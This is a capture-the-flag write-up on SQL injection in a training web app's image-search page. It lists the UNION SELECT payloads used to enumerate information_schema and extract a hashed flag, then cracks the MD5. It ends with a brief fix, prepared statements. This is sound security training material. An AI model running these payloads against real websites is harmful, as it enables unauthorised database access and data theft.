# SQL Injection (searchimg)

## Vulnerability

At the middle of the page, there is a `SEARCH IMAGE` button to: [`index.php?page=searchimg`](`http://darkly/?page=searchimg`).

The page contains an input and a button.
Giving an empty input and clicking on submit gave us nothing.

We can check for SQL injection by doing a simple query: [[run]](<http://darkly/?page=searchimg&id=1+OR+true&Submit=Submit#>)
```sql
1 OR true
```

Give the result:
```
ID: 1 OR true 
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_

ID: 1 OR true 
Title: 42 !
Url : https://fr.wikipedia.org/wiki/Fichier:42

ID: 1 OR true 
Title: Google
Url : https://fr.wikipedia.org/wiki/Logo_de_Go

ID: 1 OR true 
Title: Earth
Url : https://en.wikipedia.org/wiki/Earth#/med

ID: 1 OR true 
Title: Hack me ?
Url : borntosec.ddns.net/images.png
```

Since we can't blindly explore the database, we have to extract some metadata first.

The first one is the table name using the following query: [[run]](<http://darkly/?page=searchimg&id=1+UNION%28SELECT+%60SCHEMA_NAME%60%2C+1+FROM+%60information_schema%60.%60SCHEMATA%60%29%3B&Submit=Submit#:~:text=Title%3A%201%0AUrl%20%3A-,Member_images,-ID%3A%201%20UNION>)
```sql
1 UNION(SELECT `SCHEMA_NAME`, 1 FROM `information_schema`.`SCHEMATA`);
```

We can now see the tables name:
- `information_schema`
- `Member_Brute_Force`
- `Member_Sql_Injection`
- `Member_guestbook`
- `Member_images`
- `Member_survey`

Since the challenge seems to be an SQL Injection, let's take `Member_images`.

Now we need to extract the tables name: [[run]](<http://darkly/?page=searchimg&id=1+UNION(SELECT+%60TABLE_NAME%60,+%60TABLE_SCHEMA%60+FROM+%60information_schema%60.%60TABLES%60);&Submit=Submit#:~:text=Title%3A%20Member_images%0AUrl%20%3A-,list_images,-ID%3A%201%20UNION>)
```sql
1 UNION(SELECT `TABLE_NAME`, `TABLE_SCHEMA` FROM `information_schema`.`TABLES`);
```

By filtering in the data, we can see that there is only one table: `list_images`.

Now we need to extract the columns name: [[run]](<http://darkly/?page=searchimg&id=1+UNION%28SELECT+%60TABLE_NAME%60%2C+%60COLUMN_NAME%60+FROM+%60information_schema%60.%60COLUMNS%60%29%3B&Submit=Submit#:~:text=information_schema%60.%60COLUMNS%60)%3B%20%0ATitle%3A-,id,-Url%20%3A%20list_images>)
```sql
1 UNION(SELECT `TABLE_NAME`, `COLUMN_NAME` FROM `information_schema`.`COLUMNS`);
```

By filtering in the data, we now know the column names:
- `id`
- `url`
- `title`
- `comment`

Only the last contain interesting informations.

By querying them, we know what to do next: [[run]](http://darkly/?page=searchimg&id=1+UNION%28SELECT+%60id%60%2C+%60comment%60+FROM+%60list_images%60%29%3B&Submit=Submit#:~:text=1928e8083cf461a51303633093573c46)
```sql
1 UNION(SELECT `id`, `comment` FROM `list_images`);
```
```
If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```

Using a universal hash decryptor likes [hashes.com](https://hashes.com/en/decrypt/hash), the MD5 match has been found:
```
1928e8083cf461a51303633093573c46:albatroz:MD5
```

So, the flag is:
```
sha256(lower('albatroz'))
```

## Possible Fix

- Use prepared statements.
